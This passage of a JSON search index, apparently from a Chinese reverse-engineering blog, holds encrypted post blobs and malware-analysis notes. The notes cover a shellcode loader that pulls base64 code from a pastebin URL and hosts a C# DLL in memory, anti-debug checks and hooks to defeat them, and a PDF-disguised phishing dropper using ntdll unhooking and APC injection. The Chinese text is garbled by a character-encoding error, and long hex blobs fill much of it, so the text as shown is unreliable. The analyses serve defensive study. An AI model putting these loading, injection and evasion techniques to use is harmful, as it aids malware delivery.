7a4a4353815da9effa6b3dd465b4cedcf2d67acce98064290f871cdbe2ed62c2650b197969866d150709d73d20eb9fc83c41a7216ce6f38eecf34937e415d3828ac207537773aabd9d58d1898b33f76df955895538fc41","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 7ï¼ˆx64 - æ¼æ´éšè—æ³¨å…¥ï¼‰","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ a015281182418cda67d19eecbbb4c0a5","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7(x64-%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 8ï¼ˆx64 - r3è¿›å…¥r0ï¼‰","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ c437ed21faa00697120ece7df058da38070955587d20dd53384958e7cd93b7e718cd3e008fcea7da8c6a8b8d55c41c820a49da92c12da0169c32d43e674b6e0f7975e05d5c1c28c9133aabb4dbf9903043385a807fd7639b158a2df7003d3c208988abb7e3693599ec46669f37d61309ccfc832a0d399ffd59712ce0e3ad51fce329ea8424bf404cc5a61273ca5348c6d434b33e6f21e501e2c80c63a06c7cf15d8144861276513ed08f2810db830ceced86c73cb3907c776b45c119d877ffa28d6a2957efca12c86e09be317b1de366bde8ffabb4a18ddf1c0d09e54a3380c64ba60b12a8788e8dcbc305801098cf6b45c990512746bd9da979716c309d97223a03b7f605bd8688253ca8f80351d5770d7dc9dda52328f1941fe145f24f167a1c3108bd43af92858a9728351bd9c2efe9a487ff7831f83a23d7642447c6dc0618806c133dbaa697b923ca8c8a632efea5e36bb6f5c47b6b9e6cf0e24e4f3ceabc4bb0c60b8bd1b9a4760454b456f5c1987de475cc4db015d73097093cbdf5d57f1dbef383308af15af5750711a4818e3beec5ca384a1feb22705abd3b198ad703e1b861f7b2b5143c0af7467afe9aae55452947c4b2de616183d80d9a841134413dedabab8f966538c5c16495a6a962bb7dbf0e9201c9cd6eacfb7fd84646154b265bdb2f5269a26741cbdd3134804c1eeb4a89996c840910d6dc710bb3c25572c3308a856d27fd3f3f7a80387ef6e7b436536c71360bdbf3cd451c5c7b0856f91d21c49b1614b099ada67ec2578813b4eda10d6518749443337180cff441e431291c7c1d50cdbfee50c20529de95f5b906a12e9ead58c7d416c6d8d356022fb77654ed3f4f5656ef90362906e3a4a67ec3ca0156286bf13ed6809fc9dd4987148287edbedfa5cb17b70d7a09b0c989b8f0f4afc275d0bf8d46241137c59e7720dfc51440308f2fba28728b74ce2c615fc6a42a8e66090b380f95012518010bb6cb8d0a14c0872f60f4746c0041a775b7d9226f2dac1508b6be7a1f05b60621fb3b2ce59900f9feeccf9580d5833534db0d1f729fdff4a735f1e8e6b3b96527aec483914a55af954c47385100ad8d478cbb15fefe452d5ccb9421cb6bed4018832e5b80b2dc2961e536ff49c1bc30f258e0f6ffd0b17d00bb18261d553eb6aabaa00101565001372dd2e6eab908e39ad5e42d74f7774b2b965e309c7c5016e308f75f9659cc03816bc2e73a59c91606c926b89e696adee2cfc2b33f9f4b86e7f1155dacac8ccd7dc5d3468facba08fc507ce3e9939056bce93976ac7628eb8d4f991812a4a41b03015b5fa3b332036965f80ce4b9e51290024fcda3ca8c10b1d16660d3ddb403fba40d58205c5ca80c","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 9ï¼ˆx64 - r3è¿›å…¥r0ï¼‰","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ fa5d0ff48b3407361d3fdf2093e2198fef225b815d7266bb1882050a9f7fbd0354d333082715d0e31db571277e57326da5502234bc7d34336fce3f684830ea9f039cb68494865d0f1f76f1aa8ff01774c8a5941cfd20827ca48ba8acfed8486e66732722b1ebb88cf4804d9482f8b979a04843773f4834c21661b49adce874108c26a3656d9639496b86b8c8ca7df5ee6ae0da2507a7ac529be86011ac6a265754c738d7c46bbd553a49f2fe80ecd067da7f5bd9db1515a3674ab007b8a36561698176668560fdde30f4d80b7feec0c5ee9c89ceeb15c0cd05fbd1ef296615dccef6b602006fa0ddf63887c21bd8a343a2e3e2f527085af7c8058e767616007d4044b4bdb7543c4f6899cc541a15e25cd0de2a70d6344b270683006aafbbca21ae3d34020acc79b6785f63976d3cc069e0191ea3aafa7a0a1969ba258a922e637ce2864a1c9c7dbf74878afc7e83734286d77f4fc9a40f849499b96d5c4cfa217e863d80966e0747bebbaf2fb61be98b031ef660a59e8fd28146d2c1e73fcebf8ed8592f76cb845d7e688bf259d1fbad39494a111352fc6d5d487910ac792ac7dcd8cf6163804d77efb68cd688bddd4506777a5e903f53af85bd986aacc4a69b6bea3b9d7d78931aed7d69dbd8e97f712edb59a76104a48fb5de2b432da94ed208252aabd7df7ed3917a81b67515a2e2db3eb8adf21280240fab863014d92be60312f25f0f45887f55db16429e4f707de20bf9d4ff7e01101b754ffb2c84b8990f3d8531e3c3ac170c067d5325c4bafb9f4ff8be949b55ab694f5a514b602f48b2818dfe398bba39567bb92b545ccbfb2a0e63a6c998f38a601229757e3079b54c5db11e874f5f7c34935bc6c38bed4500c123dee6b253a2f101d8e33a203948c803e6c6a67bf80823dbf795744b8b677aca534fc74d80990d9dd616acc6255f0c8942ffbeead34f65929129998c3b584319096051a240b946dd707561855e70f77953c7ec8477bdb5ba071a774a88b3fef7f7f96bad56b04fa46583608d6a48d7a08dceaa761ac3241b49806a040b0526f21c453fea3b656a7173f53546d2b27e22364f413dd71b2ab058338fdd0d8cb78ccfa00ef583334baa0ee75c4cf203e2eb5b8e8716266aba9ea1dd68737d0114f9a45952bfbd93dc1340bc9f7eb01502b7ee291211074346823c4f16041f83fb43dbfbcd18449b16c780703c4792943de8b249bc6b18b4daac6d3e5f8f2f67595f87d773be23eb480025c827ee3f60e2550725f7fc877d9eef7a49a6aad8eb24ec85aa1917fb8699f82cb2cdf8936c8a98fecf91409ef6371ad3f0c8f55b04e55cfa8a7b8bce0238dd2a91aa5da0fd8f506bd80fa153cc3c111c3f1289744c6a56c00ab0a6bc9bf2bdd0b6083847b25cbfec22ea0079cab589ee2b34ea3fe47b0a626bdba309113baca0feb60fe82b865cbb9780a33f034a810e49f4981d929a9d7f00f7c42dcd80576489b0ace557eba643c461b677febc8b471c419b12790a3389f8a219f50e4dcca5c61148698c44a50d1ae797131c344863547a38eeb30aa248c38a3d4b587bf5fc2be64e23194e4547f7eef9355fbfd322814a78b2dfd4e16f334894eebb019b5cf1470995addc026e09efa845d29347e9347239759c2ed812d414e73e5301e2ddb079b1c2536defec725a67faf3f9c5c2a673f039dd793ec4daec158b2d146501633e7dccc47fd975f4e58a2607271485e9e40067536a0e3b8dba05d6ec7002d9d2191ca64153ec9e0b534065b0e01d04fc52af28b895021b94191faafc95ef7736c2752af5a369467e893b8544afe11a15fd18c68de5a5a35ebabea2f28382be7d93d025b87629107a53f22245a81cc8b8d1bcd337aa9a4ad75067826b08e352aabfc72f2533349d7f5714bafabfe56ab1c8c1e3517a9a490772ebfc66e3cf98f08668014eae31074a9598c8e057c7d9641969646f8abbd26311ebb9d40eeb116d879955939d5f4a588ae7896ad7c0da40000b24a522f748a5c7f2d5690444d689256f0c3e6c485b2e7678a9430302134d71d571cf349d1d18beac3a5d642e7bab9f86592b6dde0fc690209087c85df3c6141982ed3647e099a0174fcd4811aa46fa0a013f5fa5a476f517465c78c64097b440d31af7f013cdb7f38d7cef9aeef7898c0f626571d21b77718e3bf25f211b0a919b323d349326498910d534c0028e7d67c27a20c9089c323e58abc7271b1d73bbda330d056c0d6dcec4a4a0b572a8ba27b3fd","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"Cå†…å­˜åŠ è½½C# æœ¨é©¬åˆ†æ","text":"æœ¨é©¬åˆ†æ1.æ‹–åˆ°æŸ¥å£³ä¸­ æ²¡æœ‰åˆ†æå‡ºæ¥ 2.ç›´æ¥ç”¨ç«ç»’å‰‘çœ‹ä¸€ä¸‹è°ƒç”¨ C# çš„ç³»ç»Ÿdll è¿è¡Œçš„æ—¶å€™ å¹¶æ²¡æœ‰å‘ç°æœ‰ä»€ä¹ˆç½‘ç»œè¯·æ±‚ 3.ç›´æ¥æ‹–IDA å‘ç°IDAè¯†åˆ«å‡ºæ¥å¾ˆå¤šå‡½æ•° çœ‹äº†ä¸€ä¸‹å­—ç¬¦ä¸²ä¹Ÿæ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ ä¸»å‡½æ•°ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„ ä»”ç»†çœ‹ä¸»å‡½æ•° ä¸€å †ä¹±ä¸ƒå…«æ‚çš„åˆ¤æ–­å’Œ ifï¼Œä½†æ˜¯ åœ¨è¿™é‡Œé¢ å®ƒè‚¯å®šè¦è°ƒç”¨å‡½æ•°ï¼Œæˆ‘åªå‘ç°äº†ä¸€ä¸ªè°ƒç”¨ç‚¹ è¿›å»åˆ†æå‘ç°äº†ç±»ä¼¼çš„ä»£ç ç»“æ„ï¼ˆæœ‰ç‚¹åƒllvmè¿‡çš„ä»£ç ï¼‰ï¼Œå®ƒè°ƒç”¨äº†InternetOpenAï¼ˆå¯¼å…¥è¡¨ä¸­æœ‰ä¸€äº› winiNet httpè¯·æ±‚çš„å‡½æ•°ï¼‰ç„¶ååˆjmpèµ°äº† winiNetHttpè¯·æ±‚å‚è€ƒç½‘å€ï¼šhttps://my.oschina.net/allenwen/blog/685573 4.x32dbgåŠ¨æ€è°ƒè¯• ç›´æ¥ä¸‹æ–­ InternetConnectA,HttpOpenRequestA çœ‹ä¸€ä¸‹å®ƒçš„è¯·æ±‚ url: pastebin.com:443(0x1BB)/raw/nrSZnmgc Get Https(443) è¿”å›å€¼å¾ˆåƒbase64 base64è§£å¯†ä¹‹å å‘ç° å¼€å¤´å°±æ˜¯ e9 0a 05 00 00 å¾ˆåƒjmp (æ€€ç–‘æ˜¯shellcode) åŠ¨æ€è°ƒè¯•ä¸‹æ–­ç‚¹ï¼šInternetReadFile å‡½æ•°è¿”å›ç»“æŸçš„åœ°æ–¹ å› ä¸ºè¿”å›å€¼æ˜¯base64åŠ å¯†ï¼Œè€Œä¸”æ˜¯shellcodeï¼Œæ‰€ä»¥æ€€ç–‘å‡ºå»ä¹‹åè§£å¯†æ•°æ®,è§£å¯†å®Œä¹‹åæŠŠshellcodeè´´åˆ°å†…å­˜ä¸­ ç›´æ¥ä¸‹memcpyï¼Œå‘ç°ç¨‹åºéƒ½è¿è¡Œèµ·æ¥äº† å®ƒéƒ½æ²¡æœ‰copyâ€¦ æ‰€ä»¥åªèƒ½æ…¢æ…¢è·Ÿ æ‰¾åˆ°å®ƒè´´shellcodeçš„åœ°æ–¹ï¼Œç„¶åä¸‹æ–­ç‚¹,åŠ¨æ€è·Ÿè¸ª åŠ¨æ€è°ƒè¯•shellcodeçš„æ—¶å€™å‘ç°äº†CåŠ è½½C#çš„å‡½æ•°Cå†…å­˜è¿è¡ŒC#dll-å‚è€ƒåœ°å€ï¼šwww.cnblogs.com/flyDream12315/p/6062920.html LoadLibrary(â€œmscoree.dllâ€); LoadLibrary(â€œwininet.dllâ€); LoadLibrary(â€œoleaut32.dllâ€); ç½‘ç»œæ‹‰å–shellcode base64è§£å¯† æ˜¯ä¸ªPEæ–‡ä»¶ esp+104 = PeDll CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;pMetaHost); ICLRMetaHost: IUnknownï¼š (pMetaHost)+0xCçš„ä½ç½® pMetaHost-&gt;GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (VOID)&amp;pRuntimeInfo); ICLRRuntimeInfo: *(*pRuntimeInfo)+0x28çš„ä½ç½® pRuntimeInfo-&gt;IsLoadable(&amp;load); (pRuntimeInfo)+0x24çš„ä½ç½® pRuntimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (VOID)&amp;pRuntimeHost); ICorRuntimeHost: *(*pRuntimeHost)+0x28çš„ä½ç½® pRuntimeHost-&gt;Start() *(*pRuntimeHost)+0x34çš„ä½ç½® pRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain) (pAppDomain) ç¬¬ä¸€ä¸ªå‡½æ•° pAppDomain-&gt;QueryInterface(IID__AppDomain, (VOID)&amp;pDefaultAppDomain); SAFEARRAY* pSafeArray = SafeArrayCreate(0x11,1,pData) SafeArrayCreateå‡½æ•°ç›¸å…³å‚è€ƒåœ°å€ï¼šhttps://blog.csdn.net/jisuanjixu/article/details/5959186 esp+0x110 å•æ­¥è¿›å»å‘ç°æ˜¯ SafeArrayAccessData(pSafeArray,&amp;pvData) æœ‰ä¸€å—å¾ªç¯èµ‹å€¼çš„åœ°æ–¹ï¼ŒæŠŠPEdllçš„æ•°æ®å¤åˆ¶åˆ°äº†pvDataä¸­ åˆæ˜¯ä¸€ä¸ªcallï¼Œå•æ­¥ç›´æ¥è¿›å»æ˜¯ SafeArrayUnaccessData(pSafeArray) esp+0x14 = pDefaultAppDomain,*(*pDefaultAppDomain)+0xB4 pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly); åŠ è½½C#dll pAssembly(_Assembly) *(*pAssembly)+0x40 pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo) è·å–å…¥å£å‡½æ•° [esp+12C] (verctorArg) = SafeArrayCreateVector(8,0,1) esi(verctor2) = SafeArrayCreateVector(0xC,0,1) è¿™ä¸ªshellcodeè¿›æ¥çš„æ—¶å€™æœ‰ä¸ªå‚æ•°ï¼Œeax = SysAllocString(arg) SafeArrayPutElement(verctorArg,&amp;int(0),eax) SafeArrayPutElement(verctor2,&amp;int(0),ä¸€ä¸ªå˜é‡) esp+C = pMethodInfo pMethodInfo-&gt;Invoke_3(obg,verctor2,&amp;retVal) æ‰§è¡Œç¨‹åºå…¥å£å‡½æ•° mian æ€»ç»“ï¼šå…¨æµç¨‹å°±æ˜¯exeè¿è¡Œäº†ä¸€ä¸ªshellcode shellcodeä¸­æ‰§è¡Œäº†C#çš„dllï¼Œæ‰€ä»¥ä¸»ç¨‹åºåªæ˜¯ä¸€ä¸ªåŠ è½½å™¨è€Œå·²ï¼Œå½“è·å–åˆ°C# pedllçš„æ—¶å€™ï¼Œå…¶å®å°±å¯ä»¥ç›´æ¥æ‹‰dnspyé‡Œé¢æŸ¥çœ‹","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/CSharp%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"title":"Eç›¾åè°ƒè¯•åˆ†æ","text":"GetStartupInfo åœ¨ç¨‹åºå¯åŠ¨åï¼Œä¼šæœ‰ä¸€ä¸ªStartupInfoçš„ç»“æ„ä½“å˜é‡ï¼Œæ¥ä¿å­˜ç¨‹åºå¯åŠ¨çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬é€šè¿‡å…¶ä¸­å‚æ•°çš„æ”¹å˜æ¥æ£€æµ‹ç¨‹åºæ˜¯æ­£å¸¸è¿è¡Œè¿˜æ˜¯åœ¨è°ƒè¯•å™¨ä¸­è¿è¡Œçš„ å‚è€ƒåœ°å€ï¼šhttps://www.cnblogs.com/ziolo/p/3434815.html å‚è€ƒåœ°å€ï¼šhttps://blog.csdn.net/tk86935367/article/details/8174368 Eç›¾V51ä»£ç ï¼š 123456789101112BOOL UseGetStartupInfoCheckDebug(){ STARTUPINFO startUpInfo; startUpInfo.cb = sizeof(startUpInfo); GetStartupInfo(&amp;startUpInfo); if (startUpInfo.dwX != 0 || startUpInfo.dwY != 0 || startUpInfo.dwXCountChars != 0 || startUpInfo.dwYCountChars != 0 || startUpInfo.dwFillAttribute != 0 || startUpInfo.dwXSize != 0 || startUpInfo.dwYSize != 0 || (startUpInfo.dwFlags &amp; STARTF_FORCEOFFFEEDBACK)) { std::cout &lt;&lt; &quot;! GetStartupInfo debugger&quot; &lt;&lt; std::endl; return true; } return false;} ååè°ƒè¯•æ–¹æ¡ˆï¼š Hook GetStartupInfo è¿”å›ä¸€ä¸ª é0å€¼ å°±å¥½äº† Hook GetStartupInfo è¿”å›ä¸€ä¸ª é0å€¼ å°±å¥½äº† IsDebuggerPresent è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨åœ¨ç¨‹åºä¸­ï¼Œæ£€æµ‹å½“å‰ç¨‹åºæ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ï¼Œä»è€Œæ‰§è¡Œé€€å‡ºç­‰è¡Œä¸ºï¼Œè¾¾åˆ°åè°ƒè¯•çš„ä½œç”¨ã€‚ è¯¥å‡½æ•°é€šè¿‡ fs:[0x18] è·å– TEB -&gt; TEB:[0x30] è·å– PEB -&gt; PEB:[0x2] BeingDebugged:UChar è°ƒè¯•æ ‡å¿—ï¼Œ é€šè¿‡è°ƒè¯•æ ‡å¿— æ¥åˆ¤æ–­æ˜¯å¦è°ƒè¯• å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/chriz_w/article/details/52096552 å‚è€ƒèµ„æ–™ï¼šhttps://blog.csdn.net/ls1160/article/details/38105873 Eç›¾V51ä»£ç ï¼š 123456789BOOL UseIsDebuggerPresentCheckDebug(){ if (IsDebuggerPresent()) { std::cout &lt;&lt; &quot;! IsDebuggerPresent debugger&quot; &lt;&lt; std::endl; return true; } return false;} ååè°ƒè¯•æ–¹æ¡ˆï¼šhookå‡½æ•°ç›´æ¥è¿”å›false å¿ƒå¾— éƒ¨åˆ†æ ¹æ®æ ‡å¿—æ¥åˆ¤æ–­åè°ƒè¯•çš„ï¼Œå¯ä»¥é€šè¿‡ ç›´æ¥ä½¿ç”¨æ±‡ç¼–æ¥å†™åè°ƒè¯• æ¯”å¦‚ï¼šIsDebuggerPresent","link":"/2021/07/10/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"post","text":"5.71 åŠ å¯†ç‹—ç‰ˆ","link":"/2020/10/18/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E8%AF%AD%E8%A8%80%E7%B3%BB%E7%BB%9F%E6%A0%B8%E5%BF%83%E6%94%AF%E6%8C%81%E5%BA%93%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"pdfé’“é±¼æ ·æœ¬åˆ†æ","text":"è§‚å¯Ÿæ ·æœ¬ ä¸€ä¸ªåä¸ºæ’ç­è¡¨çš„pdfå›¾æ ‡çš„exeç¨‹åºï¼Œå¾ˆæ˜æ˜¾ä¸€ä¸ªé’“é±¼ç¨‹åº æŸ¥å£³ x64çš„ æ— å£³ idaé™æ€åˆ†æ ç¬¬ä¸€å—æ˜¯ä¸€ä¸ªæ¸…é™¤ntdllä¸Šçš„hookçš„å‡½æ•°ï¼ˆè¿™æ˜¯æˆ‘åˆ†æè¿‡é‡æ–°å‘½åçš„ æ˜ å°„ntdll ç„¶å è¦†ç›–äº†ntdllçš„textæ®µï¼Œè¿™æ®µåº”è¯¥æ˜¯ä»–æ•…æ„å†™äº†ä¸€ä¸ªä¸æ­£è§„çš„æ“ä½œï¼Œå¯¼è‡´IDAé™æ€åˆ†æ åˆ†æé”™äº†å±æ€§ ç¬¬äºŒå—å°±æ˜¯ä¸€ä¸ªè·å–äº†ä¸€äº›ntdllçš„å‡½æ•° ç¬¬ä¸‰å—æ˜¯è¯»å–äº†ä¸€ä¸ªèµ„æºæ–‡ä»¶ å¹¶ä¸”æŠŠæ–‡ä»¶æ”¾åˆ°äº†fileDataä¸­ ç¬¬å››å—ç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯æ“ä½œçš„å°±æ˜¯filedataï¼Œç›´æ¥çŒœæµ‹æ˜¯å¯¹æ–‡ä»¶çš„è§£å¯†æ“ä½œ ç¬¬äº”å—å°±æ˜¯åˆ›å»ºäº†ä¸ªæ˜ å°„å†…å­˜ ç¬¬å…­å— åˆ¤æ–­è¿›ç¨‹æ˜¯ä¸æ˜¯systemç”¨æˆ· ç¬¬ä¸ƒå¿« å¦‚æœæ˜¯systemç”¨æˆ· å°±ä½¿ç”¨svchost.exeæ¥ææƒå¯åŠ¨ å¦‚æœä¸æ˜¯å°±ç”¨explorer.exeæ¥ææƒ ç¬¬å…«å— ä¸æ˜¯systemç”¨æˆ· åˆ©ç”¨explorer.exeæ¥ææƒå¯åŠ¨ è·Ÿç¬¬ä¸ƒå—çš„ä»£ç æ˜¯ä¸€æ ·çš„ ææƒåˆ›å»ºçš„æ–°è¿›ç¨‹ä¹‹åç”¨æŠŠä¹‹å‰çš„filedataï¼ˆshellcodeï¼‰åˆ©ç”¨æ˜ å°„è´´åˆ°å¯åŠ¨çš„æ–°è¿›ç¨‹ä¸­ï¼Œç„¶åæ’å…¥APCæ¥å¯åŠ¨ ç¬¬ä¹å—ä»èµ„æºæ–‡ä¸­æ‹¿åˆ°ä¸€ä¸ªpdfæ–‡ä»¶ é‡Šæ”¾åˆ°å½“å‰ç›®å½•ä¸‹ ç„¶åæ‰“å¼€äº†è¯¥æ–‡ä»¶","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/pdf%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"ä¸€ä¸ªè—åœ¨æ­£å¸¸ç¨‹åºä¸‹çš„C#æœ¨é©¬æ ·æœ¬åˆ†æ","text":"å‰è¨€æœ¬æ–‡ç« åªåˆ†æäº†æœ¨é©¬åŠ è½½çš„è¿‡ç¨‹ï¼Œä¸åˆ†ææœ¨é©¬åŠŸèƒ½ èƒŒæ™¯æŠ¤ç½‘æœŸé—´ä¸€ä¸ªæœ‹å‹å‘ç»™æˆ‘çš„æ ·æœ¬è®©æˆ‘å¸®å¿™åˆ†æä¸€ä¸‹ åˆ†æè¿‡ç¨‹ ExeinfoPeæŸ¥äº†ä¸€ä¸‹æ˜¯ä¸€ä¸ªC#çš„ç¨‹åºï¼Œç„¶ååŠ äº†ä¸ªæ··æ·†ç›´æ¥de4dotå¤„ç†ä¸€ä¸‹æ‹‰å…¥dnspy åç¼–è¯‘ä¹‹åçœ‹æ²¡å‘ç°ä»€ä¹ˆhttpè¯·æ±‚ï¼Œå¯åŠ¨å‡½æ•°è¿è¡Œäº†ä¸€ä¸ªfrmMainçª—ä½“ï¼Œçœ‹äº†çœ‹ä»£ç ä»€ä¹ˆçš„å‘ç°æ˜¯ä¸€ä¸ªæ­£å¸¸çš„çª—ä½“ç¨‹åºï¼Œä»€ä¹ˆä¹Ÿæ²¡å‘ç° åŠ¨æ€è°ƒè¯• ç¨‹åºè‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œäºæ˜¯å°±åŠ¨æ€è°ƒè¯•å‘ç°ï¼Œè¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªåŠ è½½ç¨‹åºï¼Œä»–æ‰¾äº†ä¸€å¥—æ­£å¸¸ç¨‹åºçš„æºç é‡å†™äº†ä¸€ä¸ªå±æ€§çš„setå‡½æ•° åœ¨setå‡½æ•°ä¸­ï¼Œä»èµ„æºæ–‡ä»¶æ‹¿åˆ°dllç„¶ååŠ è½½dll åˆ©ç”¨åå°„åŠ è½½dllä¹‹å åå°„è°ƒç”¨å‡½æ•° Type type = assembly.GetTypes()[0]; MethodInfo method = type.GetMethod(â€œClickâ€); method.Invoke(0, parameters); åå°„è·å–åˆ°ç¬¬ä¸€ä¸ªç±»ï¼Œç„¶åè·å–è¯¥ç±»çš„Clientå‡½æ•°ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ â€œOVAGpâ€,â€bAJsâ€,â€Finastâ€ ç›´æ¥dnspyåŠ¨æ€è°ƒè¯• dumpå‡ºæ¥dllæ–‡ä»¶ dllä¹Ÿæ˜¯C#çš„ ç„¶ååŠ äº†æ··æ·†ç›´æ¥de4dotå¤„ç† ç„¶åæ‹–å…¥dnspy dnspy dllåç¼–è¯‘ çœ‹ç€è¿™æ ·ä¸€ä¸ªæ­£å¸¸çš„ç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥æ‰¾ä¸€ä¸ªClientçš„å‡½æ•° ä¸€çœ¼å°±æ˜¯åå°„è°ƒç”¨ï¼Œä¸è¿‡ä»–æ˜¯é€šè¿‡vb.netçš„ dllæ˜¯ä¿å­˜åœ¨èµ„æºå›¾ç‰‡ä¸­çš„ è¿™ä¸ªä¸ç”¨å…³æ³¨ æˆ‘ä»¬ç›´æ¥æŠŠå¤„ç†ä¹‹åçš„çš„rawAssembly ç»™dumpå‡ºæ¥å°±å¥½äº† dumpå‡ºæ¥çš„dllè¿˜æ˜¯ä¸€ä¸ªC#çš„ æ˜¯æœ‰å¤æ‚çš„æ··æ·†çš„ de4dotå¤„ç†ä¸äº†ï¼Œæˆ‘ç›´æ¥æ‰¾ç”»çœ‰å¸ˆå‚…ç»™å¤„ç†äº†ä¸€ä¸‹ç„¶åæ‹‰åˆ°dnspyé‡Œé¢çœ‹äº†çœ‹ å°±æ˜¯çœŸå®çš„æœ¨é©¬æ ·æœ¬ã€‚ æ€»ç»“æ­¤æ ·æœ¬æ˜¯ä¸€ä¸ªåŠ è½½å™¨ é¦–å…ˆä»èµ„æºæ–‡ä»¶ä¸­æ‹¿åˆ°dllé€šè¿‡C#çš„åå°„åŠ è½½èµ·æ¥ï¼Œç„¶åè¯¥dllå†æ¬¡ä»èµ„æºæ–‡ä»¶ä¸­æ‹¿åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œä»å›¾ç‰‡ä¸­æå–å‡ºæ¥åŠŸèƒ½dllï¼Œé€šè¿‡Microsoft.VisualBasicåº“çš„åå°„åŠ è½½èµ·æ¥åŠŸèƒ½dllï¼Œ åŠ è½½å™¨å’Œdlléƒ½æ˜¯ä¼ªè£…æˆäº†æ­£å¸¸çš„ç¨‹åºï¼Œå¦‚æœä¸ä»”ç»†çœ‹çš„æ—¶å€™ å°±å¯èƒ½ä»¥ä¸ºæ˜¯ä¸€ä¸ªæ­£å¸¸ç¨‹åºæ”¾è¿‡å»äº†","link":"/2021/04/15/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E4%B8%80%E4%B8%AA%E8%97%8F%E5%9C%A8%E6%AD%A3%E5%B8%B8%E7%A8%8B%E5%BA%8F%E4%B8%8B%E7%9A%84CSharp%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"}],"tags":[],"categories":[{"name":"è°ƒè¯•å·¥å…·","slug":"è°ƒè¯•å·¥å…·","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"name":"vt","slug":"vt","link":"/categories/vt/"},{"name":"WinDbg","slug":"è°ƒè¯•å·¥å…·/WinDbg","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/WinDbg/"},{"name":"å†…æ ¸åˆ†æé€†å‘","slug":"å†…æ ¸åˆ†æé€†å‘","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/"},{"name":"å¸¸ç”¨ä»£ç ç¬”è®°","slug":"å¸¸ç”¨ä»£ç ç¬”è®°","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"vt/å­¦ä¹ ç¬”è®°","link":"/categories/vt/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"vscode","slug":"vscode","link":"/categories/vscode/"},{"name":"é©±åŠ¨å¼€å‘","slug":"é©±åŠ¨å¼€å‘","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"},{"name":"å†…æ ¸é€†å‘åˆ†æä¸­æœ‰è¶£çš„æŠ€å·§","slug":"å†…æ ¸åˆ†æé€†å‘/å†…æ 